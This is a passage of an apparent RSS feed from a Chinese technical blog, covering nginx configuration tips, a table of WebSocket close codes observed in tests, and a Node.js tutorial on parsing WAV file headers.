&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;5-如何给某个路径的请求设置独立的日志文件&#34;&gt;5. 如何给某个路径的请求设置独立的日志文件？&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location ^~ /p/asm &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	access_log /var/log/nginx/a.log;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	error_log /var/log/nginx/a.err.log;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;6-如何设置nginx的静态文件服务器&#34;&gt;6. 如何设置nginx的静态文件服务器&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location / &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	add_header Cache-Control max-age&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;360000;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	root /usr/share/nginx/html/webrtc-sdk/dist/;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 如果目标地址中没有video, video只是用来识别路径的，则需要使用&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# rewrite指令去去除video路径&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 否则访问/video 就会转到 /home/resources/video 路径&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location /video &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  rewrite /video/&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;.*&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; /$1 break;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  add_header Cache-Control max-age&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;360000;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  autoindex on;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  root /home/resources/;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;7-反向代理时如何做路径重写&#34;&gt;7. 反向代理时，如何做路径重写？&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;使用 rewrite 指令，例如
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;rewrite /p/&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;.*&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; /$1 break;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;8-nginx如何配置才能做websocket代理&#34;&gt;8. Nginx如何配置才能做websocket代理？&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;location ^~ /websocket &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  proxy_pass         http://192.168.40.174:31089;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  proxy_http_version 1.1;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  proxy_set_header Upgrade $http_upgrade;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  proxy_set_header Connection &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Upgrade&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;9-如何调整nginx的最大打开文件限制&#34;&gt;9. 如何调整nginx的最大打开文件限制&lt;/h1&gt;
&lt;p&gt;设置worker_rlimit_nofile&lt;/p&gt;</description>
    </item>
    <item>
      <title>WebSocket断开码测试</title>
      <link>https://wdd.js.org/fe/websocket-disconnect-test/</link>
      <pubDate>Sat, 29 Oct 2022 11:34:02 +0800</pubDate>
      <guid>https://wdd.js.org/fe/websocket-disconnect-test/</guid>
      <description>&lt;p&gt;WebSocket断开码，一般是用到的是从1000-1015。&lt;/p&gt;
&lt;p&gt;正常的断开码是1000。其他的都是异常断开。&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;场景&lt;/th&gt;
          &lt;th&gt;服务端断开码&lt;/th&gt;
          &lt;th&gt;备注&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;刷新浏览器页面&lt;/td&gt;
          &lt;td&gt;1001&lt;/td&gt;
          &lt;td&gt;终端离开, 可能因为服务端错误, 也可能因为浏览器正从打开连接的页面跳转离开.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;关闭浏览器tab页面&lt;/td&gt;
          &lt;td&gt;1001&lt;/td&gt;
          &lt;td&gt;终端离开, 可能因为服务端错误, 也可能因为浏览器正从打开连接的页面跳转离开.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;关闭浏览器, 所有标签页都会关闭。&lt;/td&gt;
          &lt;td&gt;1001&lt;/td&gt;
          &lt;td&gt;可以发现。无论是刷新，关闭tab页面还是关闭浏览器，错误码都是1001&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ws.close()&lt;/td&gt;
          &lt;td&gt;1005&lt;/td&gt;
          &lt;td&gt;主动调用close, 不传递错误码。对服务端来说，也是异常断开。1005表示没有收到预期的状态码.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;ws.close(1000)&lt;/td&gt;
          &lt;td&gt;1000&lt;/td&gt;
          &lt;td&gt;正常的关闭，客户端必需传递正确的错误原因码。原因码不是随便填入的。比如 ws.close(1009)a&lt;strong&gt;Failed to execute &amp;lsquo;close&amp;rsquo; on &amp;lsquo;WebSocket&amp;rsquo;: The code must be either 1000, or between 3000 and 4999. 1009 is neither.&lt;/strong&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;客户端断网&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;</description>
    </item>
    <item>
      <title>Node.js读取wav文件</title>
      <link>https://wdd.js.org/fe/nodejs-read-wav-file/</link>
      <pubDate>Sat, 29 Oct 2022 11:32:32 +0800</pubDate>
      <guid>https://wdd.js.org/fe/nodejs-read-wav-file/</guid>
      <description>&lt;p&gt;相比于普通的文件，二进制的文件略显神秘。本次就为大家揭开二进制文件的面纱。&lt;/p&gt;
&lt;h1 id=&#34;wav文件的格式&#34;&gt;WAV文件的格式&lt;/h1&gt;
&lt;p&gt;下图是一个普通的wav文件的格式。其中除了最后的data部分，其他的每个格子都占用了固定大小的字节数。&lt;/p&gt;
&lt;p&gt;知道字节数之后，就需要按照正确的字节序读区。字节序读反了，可能读出一堆乱码。 关于字节序，可以参考阮一峰老师写的&lt;a href=&#34;https://www.ruanyifeng.com/blog/2016/11/byte-order.html&#34;&gt;理解字节序&lt;/a&gt;这篇文章。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/fe/nodejs-read-wav-file/2022-10-29-11-33-26.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;step1-读取文件&#34;&gt;step1: 读取文件&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fs&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;path&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;require&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;path&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;fs&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readFileSync&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;path&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;join&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;__dirname&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;./a.wav&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;原始的打印，二进制以16进制的方式显示。看不出其中有何含义。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;node&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;js&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Buffer&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;a4&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;57&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;66&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;01&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;02&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;f&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;d&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;04&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt; ... &lt;span style=&#34;color:#ae81ff&#34;&gt;4727674&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;more&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;bytes&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;step2-工具函数&#34;&gt;step2: 工具函数&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 将buf转为字符串
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;buffer2String&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;       &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;push&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;buf&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;readUInt8&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;i&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; String.&lt;span style=&#34;color:#a6e22e&#34;&gt;fromCharCode&lt;/span&gt;(...&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 对读区的头字段的值进行校验
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 实际上头字段之间是存在一定的关系的
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt;  &lt;span style=&#34;color:#a6e22e&#34;&gt;validWav&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;wav&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;fileSize&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//20        2   AudioFormat      PCM = 1 (i.e. Linear quantization)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//                                Values other than 1 indicate some 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//                                form of compression.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 22        2   NumChannels      Mono = 1, Stereo = 2, etc.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 24        4   SampleRate       8000, 44100, etc.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 28        4   ByteRate         == SampleRate * NumChannels * BitsPerSample/8
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 32        2   BlockAlign       == NumChannels * BitsPerSample/8
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//                                The number of bytes for one sample including
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//                                all channels. I wonder what happens when
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//                                this number isn&amp;#39;t an integer?
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 34        2   BitsPerSample    8 bits = 8, 16 bits = 16, etc.
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;wav&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;AudioFormat&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;includes&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;wav&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;NumChannels&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;[&lt;span style=&#34;color:#ae81ff&#34;&gt;8000&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;44100&lt;/span&gt;].&lt;span style=&#34;color:#a6e22e&#34;&gt;includes&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;wav&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;SampleRate&lt;/span&gt;)){
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
